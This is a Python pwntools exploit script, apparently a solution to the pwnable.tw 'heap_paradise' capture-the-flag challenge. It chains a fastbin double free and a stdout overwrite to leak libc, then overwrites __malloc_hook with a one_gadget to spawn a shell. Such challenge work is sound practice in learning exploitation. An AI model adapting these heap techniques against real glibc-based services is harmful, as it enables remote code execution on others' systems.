#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pd = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len
A = pd()

exe = ELF("heap_paradise_patched", checksec=False)
libc = ELF("libc_64.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on

continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10308
        return remote(host, port)

p = conn()

def alloc(size, data):
    slan(p, b'Choice', 1)
    slan(p, b'Size', size)
    sa(p, b'Data', data)

def free(index):
    slan(p, b'Choice', 2)
    slan(p, b'Index', index)

print("Setting up")
alloc(0x40, flat(z(0x38), 0x51)) # 0
alloc(0x40, flat(z(0x38), 0x21)) # 1
alloc(0x60, flat(z(0x18), 0x51, z(0x18), 0x31)) # 2

print("Chunk overlapping")
# Fastbin dup
free(0)
free(1)
free(0)

alloc(0x40, p8(0x40)) # 3
alloc(0x40, A) # 4
alloc(0x40, A) # 5
alloc(0x40, flat(0, 0x71)) # 6

free(1) # Free to fastbins

free(6)
alloc(0x40, flat(0, 0x91))
free(1) # Free to unsortedbins

free(6)
alloc(0x40, flat(0, 0x71) + p16(0x45dd))

alloc(0x60, A)

print("Leaking libc")
# stdout overwrite to leak libc
flags = 0xfbad1800
alloc(0x60, flat(z(0x33), flags, z(0x18 + 1)))

ru(p, p64(flags))
rn(p, 0x18)

libc.address = leak_bytes(rn(p, 6), 0x3c4600)
lg("libc base", libc.address)

print("Chunk overlapping")
# Fastbin dup
free(1)
free(2)
free(1)

print("Overwriting malloc hook")
# Overwrite malloc hook
malloc_hook = libc.symbols['__malloc_hook']
lg("malloc hook", malloc_hook)
one_gadget = libc.address + 0xef6c4
lg("one gadget", one_gadget)

alloc(0x60, p64(malloc_hook - 0x23))
alloc(0x60, A)
alloc(0x60, A)
alloc(0x60, flat(z(0x13), one_gadget))

print("Trigger malloc printerr")
# Malloc printerr
free(0)
free(0)

print("Spawn shell")
rr(p, 1)
ia(p)